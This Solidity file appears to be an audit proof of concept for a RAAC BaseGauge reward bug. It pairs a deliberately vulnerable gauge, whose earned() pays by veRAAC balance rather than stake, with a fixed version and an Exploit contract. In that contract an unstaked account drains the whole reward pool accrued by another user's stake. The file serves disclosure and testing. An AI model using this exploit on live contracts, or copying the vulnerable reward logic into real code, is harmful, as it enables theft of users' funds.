// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  RAAC BaseGauge — CodeHawks 2025-02
    earned() pays getUserWeight(), and that weight is the veRAAC balance.
    A ve holder who never staked collects the reward that accrued against
    other users' stake.
*/

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BaseGauge {
    struct UserState {
        uint256 rewardPerTokenPaid;
        uint256 rewards;
    }

    Token public stakeToken;
    Token public rewardToken;
    Token public veToken;
    uint256 public totalSupply;
    uint256 public rewardRate;
    uint256 public lastUpdateTime;
    uint256 public rewardPerTokenStored;
    uint256 public periodFinish;
    mapping(address => uint256) public balances;
    mapping(address => UserState) public userStates;

    constructor(Token stake_, Token reward_, Token ve_) {
        stakeToken = stake_;
        rewardToken = reward_;
        veToken = ve_;
        rewardRate = 1000 ether;
        periodFinish = type(uint256).max;
    }

    function lastTimeRewardApplicable() public view returns (uint256) {
        return block.timestamp < periodFinish ? block.timestamp : periodFinish;
    }

    function getRewardPerToken() public view returns (uint256) {
        if (totalSupply == 0) {
            return rewardPerTokenStored;
        }
        return rewardPerTokenStored
            + ((lastTimeRewardApplicable() - lastUpdateTime) * rewardRate * 1e18 / totalSupply);
    }

    function _getBaseWeight(address account) internal view returns (uint256) {
        return veToken.balanceOf(account);
    }

    function _applyBoost(address account, uint256 baseWeight) internal view returns (uint256) {
        if (baseWeight == 0) return 0;
        account;
        return baseWeight;
    }

    function getUserWeight(address account) public view virtual returns (uint256) {
        uint256 baseWeight = _getBaseWeight(account);
        return _applyBoost(account, baseWeight);
    }

    function earned(address account) public view virtual returns (uint256) {
        // @> VULN: weight is the veRAAC balance, so an account with zero stake is still paid
        return (getUserWeight(account) * (getRewardPerToken() - userStates[account].rewardPerTokenPaid) / 1e18)
            + userStates[account].rewards;
    }

    function stake(uint256 amount) external {
        require(amount > 0, "amount");
        totalSupply += amount;
        balances[msg.sender] += amount;
        require(stakeToken.transferFrom(msg.sender, address(this), amount), "stake");
    }

    function getReward() external virtual returns (uint256 reward) {
        reward = earned(msg.sender);
        userStates[msg.sender].rewardPerTokenPaid = getRewardPerToken();
        userStates[msg.sender].rewards = 0;
        if (reward > 0) {
            require(rewardToken.transfer(msg.sender, reward), "pay");
        }
    }
}

contract BaseGaugeFixed is BaseGauge {
    constructor(Token stake_, Token reward_, Token ve_) BaseGauge(stake_, reward_, ve_) {}

    function earned(address account) public view override returns (uint256) {
        if (balances[account] == 0) return 0;
        return (balances[account] * (getRewardPerToken() - userStates[account].rewardPerTokenPaid) / 1e18)
            + userStates[account].rewards;
    }
}

contract Staker {
    Token public stakeToken;

    constructor(Token stake_) {
        stakeToken = stake_;
    }

    function stakeInto(BaseGauge gauge, uint256 amount) external {
        stakeToken.approve(address(gauge), amount);
        gauge.stake(amount);
    }

    function claim(BaseGauge gauge) external returns (uint256) {
        return gauge.getReward();
    }
}

contract Exploit {
    uint256 public constant STAKE_AMOUNT = 1000 ether;
    uint256 public constant REWARD_AMOUNT = 1000 ether;

    Token public stakeToken;
    Token public rewardToken;
    Token public veToken;
    BaseGauge public gauge;
    Staker public staker;
    uint256 public claimed;

    constructor() {
        stakeToken = new Token("STK");
        rewardToken = new Token("RWD");
        veToken = new Token("veRAAC");
        gauge = new BaseGauge(stakeToken, rewardToken, veToken);
        staker = new Staker(stakeToken);
        stakeToken.mint(address(staker), STAKE_AMOUNT);
        rewardToken.mint(address(gauge), REWARD_AMOUNT);
        veToken.mint(address(this), STAKE_AMOUNT);
    }

    function run() external {
        require(gauge.balances(address(this)) == 0, "unstaked");
        require(veToken.balanceOf(address(this)) == STAKE_AMOUNT, "ve");
        staker.stakeInto(gauge, STAKE_AMOUNT);
        require(gauge.totalSupply() == STAKE_AMOUNT, "supply");
        require(gauge.balances(address(staker)) == STAKE_AMOUNT, "staker balance");

        uint256 owed = gauge.earned(address(this));
        require(owed == REWARD_AMOUNT, "preview");
        claimed = gauge.getReward();

        require(claimed == REWARD_AMOUNT, "stolen");
        require(rewardToken.balanceOf(address(this)) == REWARD_AMOUNT, "attacker paid");
        require(gauge.balances(address(this)) == 0, "still unstaked");
        require(rewardToken.balanceOf(address(gauge)) == 0, "gauge drained");
        require(rewardToken.balanceOf(address(staker)) == 0, "staker unpaid");
    }
}
